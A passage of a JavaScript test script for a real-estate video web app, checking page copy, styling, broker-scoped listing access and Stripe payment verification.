      && /48 hours/.test(landing)
      && /one finished video and one recut/.test(landing)
      && !/Two revision rounds are included/.test(landing));
  const terms = fsx.readFileSync(new URL('../public/terms.html', import.meta.url), 'utf8');
  const privacy = fsx.readFileSync(new URL('../public/privacy.html', import.meta.url), 'utf8');
  check('terms page is Corridor type on paper and sky',
    /Bricolage Grotesque/.test(terms) && /#F7F4ED/.test(terms) && /#B8D7EB/.test(terms)
      && /class="sky-bar"/.test(terms) && /class="foot-bar"/.test(terms)
      && /Corridor LLC/.test(terms) && /2840 Bolingbroke Dr/.test(terms)
      && /\$200/.test(terms) && !/\$350/.test(terms) && /\$750/.test(terms)
      && /48 hours/.test(terms) && /Michigan law/.test(terms)
      && !/first one free/i.test(terms) && !/\/t\/demo/.test(terms) && !/\$260/.test(terms)
      && !/checkout|stripe/i.test(terms) && !/yearly/i.test(terms)
      && !/five-pack/i.test(terms) && !/phone walk/i.test(terms));
  check('privacy page names what we collect and does not sell the list',
    /Bricolage Grotesque/.test(privacy) && /#F7F4ED/.test(privacy)
      && /name, email, property address/.test(privacy)
      && /Default unchecked/.test(privacy)
      && /We don.t sell the list/.test(privacy)
      && /href="\/privacy"/.test(privacy) && /href="\/terms"/.test(privacy)
      && !/first one free/i.test(privacy) && !/\/t\/demo/.test(privacy));
}

// --- broker desk is not studio ----------------------------------------------
{
  const fsx = await import('node:fs');
  const desk = fsx.readFileSync(new URL('../public/listings.html', import.meta.url), 'utf8');
  const authSrc = fsx.readFileSync(new URL('../server/routes/auth.js', import.meta.url), 'utf8');

  check('desk page is Upload listing plus a sidebar',
    /Upload listing/.test(desk) && /Your listings/.test(desk) && /Working on/.test(desk) && /Past/.test(desk));
  check('desk reuses guest intake and session identity',
    /\/api\/intake/.test(desk) && /\/api\/auth\/me/.test(desk) && /\/api\/auth\/listings/.test(desk));
  check('unauthenticated desk is Sign in or Create account',
    /Create account/.test(desk)
      && /\/listings#create/.test(desk)
      && /\/api\/auth\/link/.test(desk)
      && /name="marketing"/.test(desk)
      && !/name="marketing"[^>]*\schecked/.test(desk)
      && !/\/#intake/.test(desk)
      && /class="pill" id="gate-go">Continue</.test(desk)
      && /class="pill" id="gate-go">Create account</.test(desk)
      && !/class="ghost" id="gate-go"/.test(desk)
      && !/email me a link/i.test(desk)
      && !/type="password"/.test(desk)
      && !/6432 Woodward/.test(desk));
  check('desk is not the operator studio',
    !/\/studio/.test(desk) && !/generate/i.test(desk) && !/higgsfield/i.test(desk));
  check('desk does not ship $260, $350, Custom, first-one-free, or /t/demo',
    !/\$260/.test(desk) && !/\$350/.test(desk) && !/\bCustom\b/.test(desk)
      && !/first-one-free|first one free/i.test(desk) && !/\/t\/demo/.test(desk));
  check('desk email is max@corridor.video if shown',
    /max@corridor\.video/.test(desk) && !/hello@corridor\.tours/.test(desk) && !/@corridor\.tours/.test(desk));
  check('desk footer links Privacy and Terms', /href="\/privacy"/.test(desk) && /href="\/terms"/.test(desk));
  check('desk name placeholder is generic',
    /placeholder="Your name"/.test(desk) && !/placeholder="Max Charlip"/.test(desk));
  check('desk is light homepage type and color',
    /#F7F4ED/.test(desk) && /#1E5AA8/.test(desk) && /#2B2B2B/.test(desk)
      && /#B8D7EB/.test(desk) && /#C8C2B4/.test(desk) && /#5F5C57/.test(desk)
      && /Bricolage Grotesque/.test(desk) && !/Archivo/.test(desk) && !/Instrument Serif/.test(desk) && !/#101E33/.test(desk));
  check('desk header is the homepage sky-bar, not desk chrome',
    /class="sky-bar"/.test(desk)
      && /class="wordmark" href="\/">Corridor</.test(desk)
      && /class="nav-wide" href="\/#pricing">Pricing</.test(desk)
      && /class="nav-wide" href="\/#faq">FAQ</.test(desk)
      && /class="nav-wide" href="\/listings">Sign in</.test(desk)
      && /class="nav-wide" href="\/listings#create">Create account</.test(desk)
      && /font-family:\s*var\(--sans\)/.test(desk)
      && /font-size:\s*17px/.test(desk)
      && /font-weight:\s*500/.test(desk)
      && /fonts\.googleapis\.com\/css2\?family=Bricolage\+Grotesque/.test(desk)
      && /class="lbl"/.test(desk)
      && /class="field"/.test(desk)
      && /class="pill"/.test(desk)
      && !/wordmark-play/.test(desk)
      && !/class="mark-c"/.test(desk)
      && !/M2\.4 23V10\.6/.test(desk));
  check('landing file is unchanged by the desk',
    !/desk:\s*'\/listings'/.test(fsx.readFileSync(new URL('../public/index.html', import.meta.url), 'utf8')));
  check('verify redirect target is the desk', /res\.redirect\(302, '\/listings'\)/.test(authSrc));
  check('desk list is scoped to req.account.id',
    /r\.accountId === req\.account\.id/.test(authSrc) && !/\/api\/requests/.test(authSrc));
  check('status labels are plain language',
    /Working on it/.test(authSrc) && /'Ready'/.test(authSrc) && /'Sent'/.test(authSrc));
  check('desk is not an all-listings founder console',
    !/isOperator|isAdmin|max@corridor\.video|maxcharlip@gmail\.com/.test(authSrc)
      && /r\.accountId === req\.account\.id/.test(authSrc));
}

// --- primary pills keep Corridor blue, with the shiny-cta motion ------------
{
  const fsx = await import('node:fs');
  const landing = fsx.readFileSync(new URL('../public/index.html', import.meta.url), 'utf8');
  const desk = fsx.readFileSync(new URL('../public/listings.html', import.meta.url), 'utf8');
  const shineOn = (src) =>
    /@property --gradient-angle/.test(src)
    && /conic-gradient\(/.test(src)
    && /--animation:\s*gradient-angle/.test(src)
    && /--animation:\s*shimmer/.test(src)
    && /animation-play-state:\s*running/.test(src)
    && /--shiny-cta-bg:\s*#1E5AA8/.test(src)
    && /--shiny-cta-bg-subtle:\s*#17457F/.test(src)
    && /--shiny-cta-fg:\s*#ffffff/.test(src)
    && /--shiny-cta-highlight:\s*#B8D7EB/.test(src)
    && /--shiny-cta-highlight-subtle:\s*#D4E7F3/.test(src)
    && /\.pill\s*\{/.test(src)
    && /border-radius:\s*999px/.test(src)
    && /font-size:\s*15px/.test(src)
    && /background:\s*#1E5AA8/.test(src);
  const landingKeys = landing.match(/@keyframes\s+[\w-]+/g) || [];
  const deskKeys = desk.match(/@keyframes\s+[\w-]+/g) || [];
  check('homepage primary pills use the shiny-cta motion in Corridor blue', shineOn(landing));
  check('listings Continue and upload pills use the same shiny-cta motion', shineOn(desk)
    && /class="pill" id="gate-go">Continue</.test(desk)
    && /class="pill" id="go">Upload listing</.test(desk));
  check('landing keyframes are only the pill shine',
    landingKeys.length > 0
      && landingKeys.every((k) => /gradient-angle|shimmer/.test(k))
      && !/@keyframes stroll-|@keyframes stride|@keyframes painted-drift|@keyframes river-flow/.test(landing));
  check('listings keyframes are only the pill shine',
    deskKeys.length > 0 && deskKeys.every((k) => /gradient-angle|shimmer/.test(k)));
  check('shiny pills do not import Inter, React, or a new UI stack',
    !/family=Inter/.test(landing + desk)
      && !/\bInter\b/.test(landing + desk)
      && !/DM Sans/.test(landing + desk)
      && !/styled-jsx|shadcn|tailwind|next\/|from ['"]react['"]|\/components\/ui/.test(landing + desk)
      && !/#8484ff/.test(landing + desk));
  check('outline mail pills stay a static border, not a shine',
    /pill-mail/.test(landing) && /pill-mail::before/.test(landing) && /content:\s*none/.test(landing));
}

// --- listing/tour page stays the existing /t/:slug template, now light ------
{
  const fsx = await import('node:fs');
  const tourPage = fsx.readFileSync(new URL('../public/tour.html', import.meta.url), 'utf8');
  const tourJs = fsx.readFileSync(new URL('../public/tour.js', import.meta.url), 'utf8');
  const server = fsx.readFileSync(new URL('../server/index.js', import.meta.url), 'utf8');
  check('tour template is still the existing public/tour.html', /tour\.html/.test(server) && /\/t\/:slug/.test(server));
  check('no parallel listing landing was added', !/\/t\/v2|\/listing2|\/tour2/.test(server + tourPage));
  check('tour page stays on the light paper background', /#F7FAFD/.test(tourPage) && !/--ink:\s*#0a0b0c/.test(tourPage));
  check('tour page uses the same primary blue', /#1E5AA8/.test(tourPage));
  check('tour page uses the moodboard palette', /#D6E6F5/.test(tourPage) && /#C45A3A/.test(tourPage) && /#2B2B2B/.test(tourPage));
  check('tour page uses a quieter sky crop of the same street art', /hero-detroit\.png/.test(tourPage) && /class="sky-wash"/.test(tourPage) && /background-size:\s*cover/.test(tourPage) && !/class="scene"/.test(tourPage));
  check('tour still plays stops and captures leads', /shot_view/.test(tourJs) && /\/leads/.test(tourJs) && /cta-top/.test(tourJs));
  check('tour still explains the page, QR, and rooms watched', /QR/.test(tourJs) && /rooms they watched/i.test(tourJs));
}

// --- payment must be confirmed, never assumed --------------------------------
{
  const fsx = await import('node:fs');
  const pay = await import('../server/payments.js');
  const pub = fsx.readFileSync(new URL('../server/routes/public.js', import.meta.url), 'utf8');

  /* Checkout hands the browser a session id on redirect. An id in a query
     string proves nothing — anyone can type one. The only answer that counts
     comes from asking Stripe, and it is asked again at the moment the work is
     committed to, not just when the form renders. */
  const gate = pub.slice(pub.indexOf('let payment = {'), pub.indexOf('const request = {'));
  check('payment is verified against Stripe, not the URL', /await verifyCheckout/.test(gate));
  check('an unverified payment is refused with 402', /status\(402\)/.test(gate));
  check('a comp code only works when one is configured', /compCode && comp/.test(gate));

  // Card data must never reach this server: Checkout is hosted by Stripe.
  const paySrc = fsx.readFileSync(new URL('../server/payments.js', import.meta.url), 'utf8');
  check('no card fields are handled server-side',
    !/\b(card_number|cvc|exp_month|exp_year)\b/.test(paySrc));
  check('checkout is the hosted Stripe session flow', /checkout\/sessions/.test(paySrc));

  // Prices come from one place so the page and the charge cannot disagree.
  check('packages carry explicit prices', pay.PACKAGES.every((p) => Number.isFinite(p.price) && p.price > 0));
  check('unit_amount is derived from the package price', /unit_amount: pkg\.price \* 100/.test(paySrc));

  // Never throws, so a Stripe outage cannot take the form down with it.
  const v = await pay.verifyCheckout('cs_test_definitely_not_real');
  check('verifyCheckout reports failure instead of throwing', v.paid === false && typeof v.reason === 'string');
  check('payments degrade to a clear reason when unconfigured',
    pay.paymentsConfigured() || typeof pay.paymentStatus().reason === 'string');
}
